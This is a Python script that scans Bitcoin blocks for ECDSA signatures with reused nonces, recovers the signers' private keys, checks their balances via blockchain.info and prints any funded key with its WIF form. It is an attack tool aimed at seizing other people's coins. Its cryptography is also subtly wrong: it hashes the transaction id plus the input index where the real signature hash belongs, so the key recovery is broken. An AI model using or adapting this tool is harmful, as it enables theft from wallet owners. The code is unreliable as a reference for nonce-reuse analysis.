
#!/usr/bin/env python3
"""
Bitcoin Block Scanner - Scans blocks for vulnerable ECDSA signatures and recovers private keys
"""
import requests
import logging
import time
import hashlib
from typing import Dict, List, Optional, Tuple
from btc_analyzer import BTCAnalyzer
from attached_assets.blockchain_api import fetch_transaction, extract_signature_components
from attached_assets.utils import private_key_to_wif, public_key_to_p2pkh_address
from ecdsa import SigningKey, SECP256k1

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class BlockScanner:
    def __init__(self):
        self.analyzer = BTCAnalyzer()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def get_block_by_hash(self, block_hash: str) -> Optional[Dict]:
        """Fetch block data by hash"""
        try:
            url = f"https://blockchain.info/rawblock/{block_hash}"
            response = self.session.get(url, timeout=30)
            if response.status_code == 200:
                return response.json()
            else:
                logger.error(f"Failed to fetch block {block_hash}: HTTP {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"Error fetching block {block_hash}: {e}")
            return None
    
    def get_block_by_height(self, height: int) -> Optional[Dict]:
        """Fetch block data by height/number"""
        try:
            # First get block hash from height
            url = f"https://blockchain.info/block-height/{height}?format=json"
            response = self.session.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if 'blocks' in data and len(data['blocks']) > 0:
                    block_hash = data['blocks'][0]['hash']
                    return self.get_block_by_hash(block_hash)
            return None
        except Exception as e:
            logger.error(f"Error fetching block at height {height}: {e}")
            return None
    
    def get_current_block_height(self) -> Optional[int]:
        """Get current blockchain height"""
        try:
            url = "https://blockchain.info/latestblock"
            response = self.session.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                return data.get('height')
            return None
        except Exception as e:
            logger.error(f"Error fetching current block height: {e}")
            return None
    
    def check_address_balance(self, address: str) -> float:
        """Check Bitcoin balance of an address"""
        try:
            url = f"https://blockchain.info/q/addressbalance/{address}"
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                balance_satoshis = int(response.text.strip())
                return balance_satoshis / 100000000  # Convert to BTC
            return 0.0
        except Exception as e:
            logger.debug(f"Error checking balance for {address}: {e}")
            return 0.0
    
    def process_transaction(self, tx_data: Dict) -> List[Dict]:
        """Process a transaction and return any recovered keys with balances"""
        found_keys = []
        try:
            tx_id = tx_data.get('hash', 'unknown')
            logger.debug(f"Processing transaction: {tx_id}")
            
            # Extract signatures from transaction inputs
            signatures = []
            for input_idx, input_data in enumerate(tx_data.get('inputs', [])):
                script = input_data.get('script', '')
                if script:
                    try:
                        # Parse DER signature from script
                        sig_components = self._parse_der_signature(script)
                        if sig_components:
                            # Create unique message hash for each input
                            message_hash = hashlib.sha256(
                                (tx_id + str(input_idx)).encode()
                            ).hexdigest()
                            
                            signatures.append({
                                'r': sig_components['r'],
                                's': sig_components['s'], 
                                'message': message_hash,
                                'input_index': input_idx
                            })
                    except Exception as e:
                        logger.debug(f"Error parsing signature from input {input_idx}: {e}")
                        continue
            
            if len(signatures) < 2:
                return found_keys
            
            # Look for nonce reuse (same r values)
            r_groups = {}
            for sig in signatures:
                r_val = sig['r']
                if r_val not in r_groups:
                    r_groups[r_val] = []
                r_groups[r_val].append(sig)
            
            # Process groups with reused r values
            for r_val, sigs in r_groups.items():
                if len(sigs) > 1:
                    logger.info(f"Found {len(sigs)} signatures with same r value in tx {tx_id}")
                    
                    # Try to recover private key from nonce reuse
                    for i in range(len(sigs)):
                        for j in range(i + 1, len(sigs)):
                            try:
                                private_key = self._recover_private_key(sigs[i], sigs[j])
                                if private_key:
                                    # Generate addresses and check balances
                                    key_info = self._process_recovered_key(private_key, tx_data)
                                    if key_info['balance'] > 0:
                                        logger.info(f"🎯 FOUND KEY WITH BALANCE! TX: {tx_id}")
                                        logger.info(f"   Private Key: {hex(private_key)}")
                                        logger.info(f"   WIF: {key_info['wif']}")
                                        logger.info(f"   Address: {key_info['address']}")
                                        logger.info(f"   Balance: {key_info['balance']} BTC")
                                        
                                        found_keys.append({
                                            'tx_id': tx_id,
                                            'private_key': hex(private_key),
                                            'wif': key_info['wif'],
                                            'address': key_info['address'],
                                            'balance': key_info['balance'],
                                            'input_pair': f"{sigs[i]['input_index']},{sigs[j]['input_index']}"
                                        })
                                        return found_keys  # Return immediately when balance found
                            except Exception as e:
                                logger.debug(f"Failed to recover key from pair {i},{j}: {e}")
                                continue
                                
        except Exception as e:
            logger.error(f"Error processing transaction {tx_data.get('hash', 'unknown')}: {e}")
        
        return found_keys
    
    def _parse_der_signature(self, script: str) -> Optional[Dict]:
        """Parse DER-encoded signature from script"""
        try:
            script_bytes = bytes.fromhex(script)
            
            for i in range(len(script_bytes) - 8):
                if script_bytes[i] == 0x30:  # DER sequence tag
                    try:
                        length = script_bytes[i + 1]
                        if i + 2 + length <= len(script_bytes):
                            der_sig = script_bytes[i:i + 2 + length]
                            return self._decode_der_signature(der_sig)
                    except:
                        continue
            return None
        except:
            return None
    
    def _decode_der_signature(self, der_bytes: bytes) -> Optional[Dict]:
        """Decode DER-encoded signature to extract r and s values"""
        try:
            if len(der_bytes) < 8 or der_bytes[0] != 0x30:
                return None
            
            pos = 2  # Skip sequence tag and length
            
            # Parse r value
            if der_bytes[pos] != 0x02:
                return None
            pos += 1
            r_length = der_bytes[pos]
            pos += 1
            r_bytes = der_bytes[pos:pos + r_length]
            r = int.from_bytes(r_bytes, 'big')
            pos += r_length
            
            # Parse s value
            if pos >= len(der_bytes) or der_bytes[pos] != 0x02:
                return None
            pos += 1
            s_length = der_bytes[pos]
            pos += 1
            s_bytes = der_bytes[pos:pos + s_length]
            s = int.from_bytes(s_bytes, 'big')
            
            return {
                'r': f"{r:064x}",
                's': f"{s:064x}"
            }
        except:
            return None
    
    def _recover_private_key(self, sig1: Dict, sig2: Dict) -> Optional[int]:
        """Recover private key from two signatures with same r value"""
        try:
            r = int(sig1['r'], 16)
            s1 = int(sig1['s'], 16)
            s2 = int(sig2['s'], 16)
            z1 = int(sig1['message'], 16)
            z2 = int(sig2['message'], 16)
            
            n = SECP256k1.order
            
            if s1 == s2:
                return None
            
            # Standard nonce reuse formula: k = (z1-z2)/(s1-s2), x = (s1*k-z1)/r
            s_diff = (s1 - s2) % n
            z_diff = (z1 - z2) % n
            
            if s_diff == 0:
                return None
                
            k = (z_diff * pow(s_diff, -1, n)) % n
            numerator = (s1 * k - z1) % n
            private_key = (numerator * pow(r, -1, n)) % n
            
            if 0 < private_key < n:
                return private_key
            
            return None
        except Exception as e:
            logger.debug(f"Error recovering private key: {e}")
            return None
    
    def _process_recovered_key(self, private_key: int, tx_data: Dict) -> Dict:
        """Process recovered private key and check balance"""
        try:
            # Generate WIF and addresses
            wif = private_key_to_wif(private_key)
            signing_key = SigningKey.from_secret_exponent(private_key, curve=SECP256k1)
            
            # Generate compressed and uncompressed addresses
            public_key_compressed = signing_key.verifying_key.to_string("compressed")
            public_key_uncompressed = signing_key.verifying_key.to_string("uncompressed")
            
            addr_compressed = public_key_to_p2pkh_address(public_key_compressed)
            addr_uncompressed = public_key_to_p2pkh_address(public_key_uncompressed)
            
            # Check balances for both address types
            balance_compressed = self.check_address_balance(addr_compressed)
            balance_uncompressed = self.check_address_balance(addr_uncompressed)
            
            # Use the address with higher balance
            if balance_compressed >= balance_uncompressed:
                return {
                    'wif': wif,
                    'address': addr_compressed,
                    'balance': balance_compressed,
                    'address_type': 'compressed'
                }
            else:
                return {
                    'wif': wif,
                    'address': addr_uncompressed,
                    'balance': balance_uncompressed,
                    'address_type': 'uncompressed'
                }
                
        except Exception as e:
            logger.error(f"Error processing recovered key: {e}")
            return {
                'wif': 'Error',
                'address': 'Error',
                'balance': 0.0,
                'address_type': 'error'
            }
    
    def scan_block(self, block_identifier: str) -> List[Dict]:
        """Scan a single block for vulnerable transactions"""
        logger.info(f"🔍 Scanning block: {block_identifier}")
        
        # Determine if it's a hash or height
        if block_identifier.isdigit():
            block_data = self.get_block_by_height(int(block_identifier))
        else:
            block_data = self.get_block_by_hash(block_identifier)
        
        if not block_data:
            logger.error(f"Failed to fetch block: {block_identifier}")
            return []
        
        block_hash = block_data.get('hash', 'unknown')
        block_height = block_data.get('height', 'unknown')
        tx_count = len(block_data.get('tx', []))
        
        logger.info(f"📦 Block {block_height} ({block_hash[:16]}...) - {tx_count} transactions")
        
        found_keys = []
        processed_count = 0
        
        for tx_data in block_data.get('tx', []):
            processed_count += 1
            if processed_count % 50 == 0:
                logger.info(f"   Processed {processed_count}/{tx_count} transactions...")
            
            keys = self.process_transaction(tx_data)
            found_keys.extend(keys)
            
            # If we found keys with balance, return immediately
            if keys:
                logger.info(f"✅ Found {len(keys)} keys with balance in block {block_height}")
                return found_keys
        
        logger.info(f"📊 Block {block_height} complete - {processed_count} transactions processed, no keys with balance found")
        return found_keys
    
    def scan_blocks_sequential(self, start_block: str, max_blocks: int = 100) -> List[Dict]:
        """Scan blocks sequentially until keys with balance are found"""
        logger.info(f"🚀 Starting sequential block scan from: {start_block}")
        
        # Determine starting point
        if start_block.isdigit():
            current_height = int(start_block)
        else:
            # Get height from hash
            block_data = self.get_block_by_hash(start_block)
            if not block_data:
                logger.error(f"Invalid starting block: {start_block}")
                return []
            current_height = block_data.get('height', 0)
        
        found_keys = []
        blocks_scanned = 0
        
        while blocks_scanned < max_blocks:
            try:
                # Scan current block
                keys = self.scan_block(str(current_height))
                blocks_scanned += 1
                
                if keys:
                    logger.info(f"🎉 SUCCESS! Found keys with balance in block {current_height}")
                    found_keys.extend(keys)
                    break
                
                # Move to next block
                current_height += 1
                
                # Small delay to avoid overwhelming the API
                time.sleep(0.5)
                
            except KeyboardInterrupt:
                logger.info("🛑 Scan interrupted by user")
                break
            except Exception as e:
                logger.error(f"Error scanning block {current_height}: {e}")
                current_height += 1
                continue
        
        logger.info(f"📈 Scan complete - {blocks_scanned} blocks scanned")
        return found_keys

def main():
    """Main function to run the block scanner"""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python block_scanner.py <block_hash_or_number> [max_blocks]")
        print("Examples:")
        print("  python block_scanner.py 800000")
        print("  python block_scanner.py 000000000000000000014dd25cd472e3373a2e0c4b4e1636f29c0d774ec63f40")
        print("  python block_scanner.py 800000 50  # Scan up to 50 blocks")
        sys.exit(1)
    
    block_identifier = sys.argv[1]
    max_blocks = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    
    scanner = BlockScanner()
    
    try:
        found_keys = scanner.scan_blocks_sequential(block_identifier, max_blocks)
        
        if found_keys:
            print("\n" + "="*80)
            print("🎯 VULNERABLE KEYS WITH BALANCE FOUND!")
            print("="*80)
            
            for i, key_info in enumerate(found_keys, 1):
                print(f"\n🔑 Key #{i}:")
                print(f"   Transaction: {key_info['tx_id']}")
                print(f"   Private Key: {key_info['private_key']}")
                print(f"   WIF Format:  {key_info['wif']}")
                print(f"   Address:     {key_info['address']}")
                print(f"   Balance:     {key_info['balance']} BTC")
                print(f"   Input Pair:  {key_info['input_pair']}")
        else:
            print(f"\n❌ No vulnerable keys with balance found in {max_blocks} blocks")
            
    except KeyboardInterrupt:
        print("\n🛑 Scan interrupted by user")
    except Exception as e:
        logger.error(f"Scan failed: {e}")

if __name__ == "__main__":
    main()
